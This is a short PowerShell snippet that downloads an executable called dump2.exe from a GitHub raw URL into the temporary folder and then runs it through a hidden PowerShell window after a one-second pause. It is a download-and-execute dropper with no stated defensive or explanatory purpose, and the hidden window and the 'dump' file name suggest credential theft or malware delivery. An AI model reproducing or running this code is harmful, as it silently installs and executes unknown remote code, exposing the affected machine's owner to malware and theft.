$url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
$output5 = "$env:TEMP\dump.exe"
Invoke-WebRequest -Uri $url5 -OutFile $output5
Start-Sleep -Seconds 1  # Adding a delay of 1 second
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-Command `"$output5`""

